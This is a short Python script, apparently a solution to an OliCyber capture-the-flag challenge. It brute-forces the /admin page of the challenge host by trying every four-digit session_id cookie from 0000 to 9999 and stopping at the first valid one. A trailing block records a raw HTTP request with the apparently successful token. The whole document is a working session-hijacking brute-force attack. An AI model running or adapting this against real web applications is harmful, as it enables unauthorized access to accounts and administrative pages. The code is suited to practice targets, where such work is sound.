import requests

url = "http://too-small-reminder.challs.olicyber.it/admin"

headers_base = {

    "User-Agent": "Mozilla/5.0",
    "Accept": "*/*",
    "Connection": "close"
}

for i in range(10000):              # 0000 → 9999
    token = f"{i:04d}"              # <-- QUI il 4d

    headers = headers_base.copy()
    headers["Cookie"] = f"session_id={token}"

    r = requests.get(url, headers=headers)

    print(f"{token} | {r.status_code} | len={len(r.content)}")

    if r.status_code == 200 and len(r.content) > 50:
        print("✅ TOKEN VALIDO:", token)
        break
"""
GET /admin HTTP/1.1
Host: too-small-reminder.challs.olicyber.it
Content-Type: application/json
Connection: close
Content-Length: 0
Cookie: session_id=2192;
"""
